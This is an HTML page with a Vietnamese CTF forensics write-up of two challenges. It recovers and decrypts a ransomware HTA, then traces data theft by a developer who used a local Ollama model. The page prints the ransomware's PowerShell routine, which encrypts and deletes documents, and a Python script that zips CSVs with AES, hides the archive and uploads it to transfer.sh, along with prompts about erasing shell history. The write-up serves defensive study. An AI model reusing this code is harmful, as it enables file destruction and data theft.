@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BlackHat MEA Qualification CTF 2026 — Forensics Write-up</title>
+<link rel="icon" href="../../favicon.svg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root { --bg:#0b0a0f; --panel:#131119; --line:#2a2632; --ink:#f0eff2; --muted:#9998a2; --purple:#b49aef; --lime:#c9ff73; }
+* { box-sizing:border-box; }
+body { margin:0; background:var(--bg); color:var(--ink); font-family:'Plus Jakarta Sans',system-ui,sans-serif; font-size:15px; line-height:1.75; }
+.wu-shell { width:min(880px,calc(100% - 40px)); margin-inline:auto; padding-block:48px 90px; }
+.wu-back { font-family:'DM Mono',monospace; font-size:11px; letter-spacing:.09em; color:var(--muted); text-decoration:none; display:inline-flex; gap:9px; align-items:center; }
+.wu-back:hover { color:var(--lime); }
+.wu-head { border-bottom:1px solid var(--line); padding-block:26px 30px; margin-bottom:10px; }
+.wu-kicker { font-family:'DM Mono',monospace; font-size:11px; letter-spacing:.14em; color:var(--purple); }
+h1 { font-size:clamp(28px,4vw,42px); line-height:1.18; letter-spacing:-.035em; font-weight:600; margin:14px 0 12px; }
+.wu-meta { font-family:'DM Mono',monospace; font-size:11px; color:var(--muted); display:flex; flex-wrap:wrap; gap:10px 22px; }
+.wu-chal { border-top:1px solid var(--line); margin-top:40px; padding-top:10px; }
+.wu-chal:first-of-type { border-top:0; }
+h2 { font-size:27px; letter-spacing:-.03em; margin:34px 0 6px; }
+h3 { font-size:19px; margin:30px 0 4px; }
+h4 { font-size:15px; margin:22px 0 2px; color:var(--purple); }
+p { color:#d5d3dc; }
+a { color:var(--lime); }
+code { font-family:'DM Mono',monospace; font-size:.9em; background:#1d1a25; border:1px solid var(--line); border-radius:4px; padding:1px 5px; color:#e6d9ff; }
+pre { background:var(--panel); border:1px solid var(--line); border-radius:10px; padding:16px 18px; overflow-x:auto; }
+pre code { background:none; border:0; padding:0; color:#cfe6b0; font-size:12.5px; line-height:1.65; }
+blockquote { margin:18px 0; padding:2px 18px; border-left:2px solid var(--purple); color:var(--muted); font-style:italic; }
+table { width:100%; border-collapse:collapse; margin:18px 0; font-size:13.5px; display:block; overflow-x:auto; }
+th, td { border:1px solid var(--line); padding:9px 12px; text-align:left; vertical-align:top; }
+th { background:#171522; font-family:'DM Mono',monospace; font-size:11px; letter-spacing:.06em; text-transform:uppercase; color:var(--muted); }
+hr { border:0; border-top:1px solid var(--line); margin:30px 0; }
+ul, ol { padding-left:22px; color:#d5d3dc; }
+li { margin:5px 0; }
+.wu-foot { margin-top:60px; border-top:1px solid var(--line); padding-top:20px; font-family:'DM Mono',monospace; font-size:11px; color:var(--muted); }
+</style>
+</head>
+<body>
+<div class="wu-shell">
+  <a class="wu-back" href="../../blog.html">&larr; FIELD NOTES</a>
+  <header class="wu-head">
+    <p class="wu-kicker">CTF WRITEUP · FORENSICS</p>
+    <h1>BlackHat MEA Qualification CTF 2026 — Forensics</h1>
+    <div class="wu-meta">
+      <span>05/09/2026 10:00 – 06/09/2026 15:30</span>
+      <span>2 thử thách: Qfact · Whisper</span>
+      <span>Lê Thanh Hải (Th4nhH4i)</span>
+    </div>
+  </header>
+<section class="wu-chal" id="qfact">
+<h2>Qfact — Forensics Write-up</h2>
+<p><strong>Giải:</strong> BlackHat MEA Qualification CTF 2026<br><strong>Category:</strong> Forensics<br><strong>Flag:</strong> <code>BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}</code></p>
+<hr>
+<h3>Đề bài</h3>
+<blockquote><p>A finance employee&#x27;s workstation was hit by ransomware. All documents were encrypted and a ransom note was left demanding payment in Bitcoin. The employee recalls opening a file they received via email. IT later removed some Defender exclusions during a security audit, and Defender flagged a suspicious file, but it was quarantined, not preserved on disk. A triage package has been collected. Recover the malicious file, figure out how the encryption works, and decrypt the affected files.</p></blockquote>
+<p>Ba nhiệm vụ:</p>
+<ol><li>Khôi phục file độc hại (từ Defender Quarantine).</li><li>Hiểu cơ chế mã hoá.</li><li>Giải mã các file <code>.enc</code>.</li></ol>
+<hr>
+<h3>1. Khảo sát gói triage</h3>
+<pre><code>EncryptedFiles/     # 9 file *.enc (Financial, Personal, Projects, Reports)
+EventLogs/          # *.evtx
+Prefetch/           # *.pf
+Quarantine/         # Defender quarantine: Entries/ ResourceData/ Resources/
+Registry/           # NTUSER.DAT, SOFTWARE, SYSTEM
+READ_ME.txt         # ransom note (UTF-16)</code></pre>
+<p><strong>Ransom note</strong> (<code>READ_ME.txt</code>):</p>
+<ul><li>Đòi 0.5 BTC → <code>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</code></li><li>Liên hệ <code>.onion</code></li><li><strong>Unique ID:</strong> <code>LOCK-DESKTOP-KLPAT9O-JM-20260628-7F3A</code></li></ul>
+<p>Unique ID có format <code>LOCK-&lt;COMPUTERNAME&gt;-&lt;2 ký tự đầu USERNAME viết hoa&gt;-&lt;ngày&gt;-7F3A</code><br>→ suy ra <strong>COMPUTERNAME = <code>DESKTOP-KLPAT9O</code></strong>, USERNAME bắt đầu bằng <code>JM</code>.</p>
+<hr>
+<h3>2. Khôi phục file độc hại từ Defender Quarantine</h3>
+<p>Windows Defender mã hoá file cách ly bằng <strong>RC4 với một key cứng</strong> trích từ <code>mpengine.dll</code> (key 256-byte công khai, bắt đầu <code>1E 87 78 1B 8D BA A8 44 ...</code>). Tham khảo công cụ kinh điển <code>defender-dump</code> / <code>quarantine.py</code>.</p>
+<p>Ba thành phần trong <code>Quarantine/</code>:</p>
+<table><thead><tr><th>File</th><th>Vai trò</th></tr></thead><tbody><tr><td><code>Entries/{GUID}</code></td><td>Metadata: threat name + đường dẫn gốc</td></tr><tr><td><code>Resources/36/&lt;SHA1&gt;</code></td><td>Con trỏ tới resource</td></tr><tr><td><code>ResourceData/36/&lt;SHA1&gt;</code></td><td><strong>Bản thân file độc hại</strong> (đã mã hoá)</td></tr></tbody></table>
+<h4>Giải RC4</h4>
+<pre><code class="lang-python">KEY = bytes([0x1E,0x87,0x78,0x1B,0x8D,0xBA,0xA8,0x44, ...])  # 256 byte
+
+def rc4(key, data):
+    S = list(range(256)); j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) &amp; 0xff
+        S[i], S[j] = S[j], S[i]
+    out = bytearray(); i = j = 0
+    for b in data:
+        i = (i + 1) &amp; 0xff; j = (j + S[i]) &amp; 0xff
+        S[i], S[j] = S[j], S[i]
+        out.append(b ^ S[(S[i] + S[j]) &amp; 0xff])
+    return bytes(out)</code></pre>
+<p><strong>Entries/{GUID}</strong> — giải RC4 header 0x3C byte, đọc 2 kích thước section ở offset 0x28/0x2C, mỗi section là stream RC4 riêng:</p>
+<ul><li>Section 1 → threat name: <strong><code>Trojan:JS/Flafisi.C</code></strong></li><li>Section 2 → đường dẫn gốc: <strong><code>C:\DevTools\Q3_Financial_Review.hta</code></strong></li></ul>
+<p><strong>ResourceData/36/&lt;SHA1&gt;</strong> — giải RC4 toàn bộ, bỏ ~212 byte header (security descriptor), phần còn lại bắt đầu bằng <code>&lt;html&gt;</code> → chính là <strong>file HTA</strong> độc hại. Lưu lại thành <code>Q3_Financial_Review.hta</code>.</p>
+<hr>
+<h3>3. Cơ chế mã hoá (phân tích HTA)</h3>
+<p>File <code>.hta</code> giả trang một trang &quot;Q3 Financial Review — Loading&quot;. Trong <code>Window_OnLoad</code> (VBScript) nó dựng một chuỗi PowerShell rồi chạy ẩn:</p>
+<pre><code class="lang-vbscript">&#x27; Passphrase ghép từ Chr()
+k = Chr(70)&amp;Chr(120)&amp;Chr(55)&amp;Chr(109)&amp;Chr(75) _
+  &amp; Chr(57)&amp;Chr(118)&amp;Chr(76)&amp;Chr(50)&amp;Chr(110) _
+  &amp; Chr(81)&amp;Chr(52)&amp;Chr(119)&amp;Chr(80)&amp;Chr(122)&amp;Chr(33)
+&#x27; -&gt; &quot;Fx7mK9vL2nQ4wPz!&quot;</code></pre>
+<p>PowerShell (rút gọn):</p>
+<pre><code class="lang-powershell">$p  = &#x27;Fx7mK9vL2nQ4wPz!&#x27;;
+$d  = [Environment]::GetFolderPath(&#x27;MyDocuments&#x27;);
+$kb = [Text.Encoding]::UTF8.GetBytes($p.PadRight(32).Substring(0,32));  # AES-256 key
+$iv = [MD5]::Create().ComputeHash(
+        [Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + $env:USERNAME));  # IV = MD5(host+user)
+
+gci $d -File -Recurse | %{
+    $c = [IO.File]::ReadAllBytes($_.FullName);
+    $a = [Aes]::Create(); $a.Key=$kb; $a.IV=$iv; $a.Mode=0; $a.Padding=2;   # CBC + PKCS7
+    $enc = $a.CreateEncryptor().TransformFinalBlock($c,0,$c.Length);
+    [IO.File]::WriteAllBytes($_.FullName+&#x27;.enc&#x27;, $enc);
+    ri $_.FullName -Force;
+}</code></pre>
+<p>Tóm tắt scheme:</p>
+<table><thead><tr><th>Tham số</th><th>Giá trị</th></tr></thead><tbody><tr><td>Thuật toán</td><td><strong>AES-256-CBC</strong>, PKCS7 padding</td></tr><tr><td>Key</td><td><code>&quot;Fx7mK9vL2nQ4wPz!&quot;</code> pad space → 32 byte</td></tr><tr><td>IV</td><td><code>MD5(COMPUTERNAME + USERNAME)</code></td></tr><tr><td>Phạm vi</td><td>duyệt đệ quy <code>MyDocuments</code>, ghi <code>.enc</code> và xoá gốc</td></tr></tbody></table>
+<p>Sau đó nó cũng ghi ransom note và beacon IV (base64) về <code>.onion</code>.</p>
+<hr>
+<h3>4. Dựng lại IV</h3>
+<p>Cần <code>COMPUTERNAME + USERNAME</code>:</p>
+<ul><li><code>COMPUTERNAME = DESKTOP-KLPAT9O</code> (từ ransom note Unique ID).</li><li><code>USERNAME = jmartin</code> — lấy từ <code>Registry/NTUSER.DAT</code> (chuỗi <code>C:\Users\jmartin</code>), khớp <code>JM</code> trong Unique ID.</li></ul>
+<pre><code class="lang-python">import hashlib
+iv = hashlib.md5(b&quot;DESKTOP-KLPAT9Ojmartin&quot;).digest()
+# a31de3916e88f240c2bf08735b965aa9</code></pre>
+<blockquote><p>Ghi chú: vì là CBC, đoán sai USERNAME (hoa/thường) chỉ hỏng <strong>block đầu tiên</strong>, các block sau vẫn giải đúng — hữu ích để dò khi chưa chắc casing.</p></blockquote>
+<hr>
+<h3>5. Giải mã toàn bộ <code>.enc</code></h3>
+<pre><code class="lang-python">import hashlib, glob, os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+key = &quot;Fx7mK9vL2nQ4wPz!&quot;.ljust(32)[:32].encode()
+iv  = hashlib.md5(b&quot;DESKTOP-KLPAT9Ojmartin&quot;).digest()
+
+for f in glob.glob(&quot;EncryptedFiles/**/*.enc&quot;, recursive=True):
+    pt = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(open(f,&#x27;rb&#x27;).read()), 16)
+    open(f[:-4], &#x27;wb&#x27;).write(pt)</code></pre>
+<p>9/9 file giải ra sạch (memo, forecast, budget, vendor payments, notes, ...).</p>
+<hr>
+<h3>6. Flag</h3>
+<p>Trong <code>Financial/Q3_auth_memo.txt</code>, &quot;master authorization code&quot; được đóng gói base64:</p>
+<pre><code>QkhGbGFnWXtkM2YzbmQzcl9xdTRyNG50MW4zX3IzYzB2M3J5XzIwMjZ9</code></pre>
+<pre><code class="lang-python">&gt;&gt;&gt; base64.b64decode(&quot;QkhGbGFnWXtkM2YzbmQzcl9xdTRyNG50MW4zX3IzYzB2M3J5XzIwMjZ9&quot;)
+b&#x27;BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}&#x27;</code></pre>
+<h4>🚩 <code>BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}</code></h4>
+<hr>
+<h3>Tóm tắt kỹ thuật</h3>
+<ol><li><strong>Defender Quarantine RC4</strong> (key cứng từ mpengine.dll) → khôi phục <code>Q3_Financial_Review.hta</code> + threat name <code>Trojan:JS/Flafisi.C</code>.</li><li><strong>HTA → VBScript → PowerShell</strong>: AES-256-CBC, key tĩnh <code>Fx7mK9vL2nQ4wPz!</code>, <strong>IV = MD5(host+user)</strong>.</li><li>Ghép <code>COMPUTERNAME</code> (ransom note) + <code>USERNAME</code> (registry) → dựng IV.</li><li>Giải mã → flag base64 trong memo tài chính.</li></ol>
+<h3>Artefact chính</h3>
+<table><thead><tr><th>Nguồn</th><th>Thông tin rút ra</th></tr></thead><tbody><tr><td><code>READ_ME.txt</code></td><td>COMPUTERNAME, khẳng định ransomware</td></tr><tr><td><code>Quarantine/Entries</code></td><td>threat name, đường dẫn gốc HTA</td></tr><tr><td><code>Quarantine/ResourceData</code></td><td>file HTA (giải RC4)</td></tr><tr><td>HTA</td><td>thuật toán, key, cách sinh IV</td></tr><tr><td><code>Registry/NTUSER.DAT</code></td><td>USERNAME = jmartin</td></tr><tr><td><code>EncryptedFiles/*.enc</code></td><td>dữ liệu cần giải + flag</td></tr></tbody></table>
+</section>
+<section class="wu-chal" id="whisper">
+<h2>Whisper — Forensics Write-up</h2>
+<p><strong>Giải:</strong> BlackHat MEA Qualification CTF 2026<br><strong>Category:</strong> Forensics<br><strong>Flag:</strong> <code>BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}</code></p>
+<hr>
+<h3>Đề bài</h3>
+<blockquote><p>A company&#x27;s SOC team received a proxy alert after a developer&#x27;s Linux workstation attempted to upload an encrypted file to an external file-sharing service. The developer claims they were just testing an AI tool for work. A forensic triage package has been collected from the workstation. Investigate the system, determine what AI tool was installed, what it was used for, and recover the data that was attempted to be exfiltrated.</p></blockquote>
+<p>Ba nhiệm vụ:</p>
+<ol><li>Xác định AI tool đã cài.</li><li>Nó được dùng để làm gì.</li><li>Khôi phục dữ liệu bị đánh cắp.</li></ol>
+<hr>
+<h3>1. Khảo sát gói triage</h3>
+<p>Cấu trúc thư mục thu thập từ workstation <code>dev-workstation</code> (Ubuntu 24.04, VirtualBox):</p>
+<pre><code>data/reports/        # customers_2025.csv, employee_directory.csv, revenue_q3.csv, vendor_contracts.csv
+etc/  lib/  usr/      # system
+home/dwright/         # user profile
+journal_exports/      # journalctl dumps
+system_info/          # pip_packages, process_list, services, sockets, ...
+tmp/                  # nhiều file &quot;cache&quot; entropy cao (decoy)</code></pre>
+<p>Điểm bất thường đáng chú ý ngay: cả <code>home/dwright/.bash_history</code> và <code>root/.bash_history</code> đều <strong>0 byte</strong> — history đã bị xoá.</p>
+<hr>
+<h3>2. AI tool là gì? → <strong>Ollama</strong> (chứ không phải Whisper)</h3>
+<p>Tên bài &quot;Whisper&quot; là mồi nhử để nghĩ tới OpenAI Whisper. Bằng chứng thực sự trỏ tới <strong>Ollama</strong>:</p>
+<ul><li><code>journal_exports/journalctl_ollama.txt</code>: service Ollama v0.30.8 lắng nghe trên <code>127.0.0.1:11434</code>.</li><li><code>system_info/network_sockets.txt</code>: xác nhận cổng <code>11434</code> do process <code>ollama</code> mở.</li><li><code>usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/tinyllama</code> → model đã pull là <strong>tinyllama</strong>.</li></ul>
+<p>Đây là một LLM chạy <strong>hoàn toàn local</strong> — đúng tinh thần của flag về sau.</p>
+<hr>
+<h3>3. Ollama được dùng để làm gì? → <code>~/.ollama/history</code></h3>
+<p>File <code>home/dwright/.ollama/history</code> (lịch sử prompt gõ vào <code>ollama run</code>) chứa hàng chục câu hỏi dev bình thường làm nhiễu, nhưng có một cụm liền mạch lộ rõ ý đồ:</p>
+<pre><code>write a python script that reads all csv files from a directory and creates an AES encrypted zip archive
+use the password Gr33nF0x42!D1amond
+also upload the archive to a remote server using requests and delete the script after successful execution
+how do I derive an encryption key from a passphrase using hashlib sha256
+how to clean the bash history in terminal so there are no traces</code></pre>
+<p>→ Dev đã dùng LLM local để <strong>viết mã đánh cắp dữ liệu</strong>: gom CSV → nén AES có mật khẩu → upload → xoá dấu vết. Điều này giải thích tại sao <code>.bash_history</code> rỗng.</p>
+<p>Mật khẩu lộ ngay trong prompt: <strong><code>Gr33nF0x42!D1amond</code></strong>.</p>
+<hr>
+<h3>4. Khôi phục script exfil</h3>
+<p>Script không còn ở home, nhưng nằm trong <strong>Thùng rác</strong> của GNOME:</p>
+<p><code>home/dwright/.local/share/Trash/files/cache_mgr.py</code><br><code>.../Trash/info/cache_mgr.py.trashinfo</code> →</p>
+<pre><code>Path=/home/dwright/cache_mgr.py
+DeletionDate=2026-06-16T13:02:46</code></pre>
+<p>Nội dung <code>cache_mgr.py</code> (rút gọn phần cốt lõi):</p>
+<pre><code class="lang-python">import os, sys, glob, hashlib
+sys.path.insert(0, os.path.expanduser(&quot;~/.local/share/.venv/lib/python3.12/site-packages&quot;))
+import pyzipper
+
+raw_key = os.environ.get(&quot;CACHE_KEY&quot;, &quot;&quot;)
+
+# KDF: KHÔNG phải sha256 như prompt hỏi, mà blake2b!
+ARCHIVE_PASSWORD = hashlib.blake2b(
+    raw_key.encode(), digest_size=32
+).hexdigest()[:20].encode()
+
+DATA_DIR    = &quot;/data/reports&quot;
+CACHE_DIR   = os.path.expanduser(&quot;~/.cache/fontconfig&quot;)   # giấu output trong cache font
+OUTPUT_PATH = os.path.join(CACHE_DIR, &quot;session.zip&quot;)
+
+def collect_and_archive():
+    csv_files = glob.glob(os.path.join(DATA_DIR, &quot;*.csv&quot;))
+    with pyzipper.AESZipFile(OUTPUT_PATH, &#x27;w&#x27;,
+            compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
+        zf.setpassword(ARCHIVE_PASSWORD)
+        for fp in csv_files:
+            zf.write(fp, os.path.basename(fp))
+    return OUTPUT_PATH
+
+def upload(filepath):
+    import requests
+    with open(filepath, &#x27;rb&#x27;) as f:
+        requests.put(&quot;https://transfer.sh/backup.zip&quot;, data=f, ...)</code></pre>
+<p>Những điểm quan trọng về cơ chế mã hoá:</p>
+<ul><li>Dùng <code>pyzipper</code> từ một <strong>venv ẩn</strong> (<code>~/.local/share/.venv</code>) chứ không phải môi trường thường.</li><li>Passphrase <code>Gr33nF0x42!D1amond</code> <strong>không dùng trực tiếp</strong> — nó là biến môi trường <code>CACHE_KEY</code>, được đưa qua KDF <code>blake2b(digest_size=32).hexdigest()[:20]</code>.</li><li>Archive được giấu tại <code>~/.cache/fontconfig/session.zip</code> — thư mục cache font, nơi ít ai để ý.</li><li>Đích upload: <code>https://transfer.sh/backup.zip</code>.</li></ul>
+<hr>
+<h3>5. Giải mã archive</h3>
+<p>Tìm được archive thật tại <code>home/dwright/.cache/fontconfig/session.zip</code>. Tái tạo mật khẩu bằng đúng KDF trong script:</p>
+<pre><code class="lang-python">import hashlib, pyzipper
+raw = &quot;Gr33nF0x42!D1amond&quot;
+pw = hashlib.blake2b(raw.encode(), digest_size=32).hexdigest()[:20].encode()
+# -&gt; d571fe77618f54b7fca8
+
+with pyzipper.AESZipFile(&#x27;session.zip&#x27;) as zf:
+    zf.setpassword(pw)
+    zf.extractall(&#x27;out&#x27;)</code></pre>
+<p>Password suy ra: <strong><code>d571fe77618f54b7fca8</code></strong></p>
+<p>Archive giải nén ra 5 file:</p>
+<pre><code>customers_2025.csv
+employee_directory.csv
+revenue_q3.csv
+vendor_contracts.csv
+internal_api_keys.csv      &lt;-- file này đã bị xoá khỏi /data/reports, chỉ còn trong archive</code></pre>
+<hr>
+<h3>6. Flag</h3>
+<p>Trong <code>internal_api_keys.csv</code>, cột <code>key_b64</code> toàn base64. Dòng <code>master_vault</code> chứa flag:</p>
+<pre><code>master_vault,QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==,production,vault_root,...</code></pre>
+<pre><code class="lang-python">&gt;&gt;&gt; base64.b64decode(&quot;QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==&quot;)
+b&#x27;BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}&#x27;</code></pre>
+<h4>🚩 <code>BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}</code></h4>
+<hr>
+<h3>Ghi chú / bẫy trong bài</h3>
+<ul><li><strong>Tên bài &quot;Whisper&quot;</strong> đánh lạc hướng sang OpenAI Whisper (speech-to-text). AI tool thật là Ollama.</li><li>Toàn bộ file trong <code>/tmp</code> (<code>.config_backup_old.tar.gz</code>, <code>journal-upload.tmp</code>, <code>.mozilla_cache.dat</code>, <code>core.python3.*</code>, …) có entropy ~8.0 nhưng chỉ là random bytes — <strong>decoy</strong> thuần, không giải mã ra gì.</li><li>KDF là <strong>blake2b</strong>, không phải sha256 như prompt gợi ý — bám theo prompt sẽ ra sai key.</li><li>Manh mối trải rộng: <code>.ollama/history</code> (ý đồ + mật khẩu) → Trash (script) → <code>.cache/fontconfig</code> (archive) → base64 trong CSV (flag).</li></ul>
+<h3>Timeline</h3>
+<table><thead><tr><th>Thời điểm</th><th>Sự kiện</th></tr></thead><tbody><tr><td>2026-06-16 13:02:46</td><td><code>cache_mgr.py</code> bị đưa vào Thùng rác (theo trashinfo)</td></tr><tr><td>—</td><td><code>.bash_history</code> bị xoá sạch (0 byte)</td></tr><tr><td>—</td><td><code>session.zip</code> upload lên transfer.sh → SOC proxy alert</td></tr></tbody></table>
+</section>
+  <p class="wu-foot">Write-up cá nhân · BlackHat MEA Qualification CTF 2026 · Forensics</p>
+</div>
+</body>
+</html>
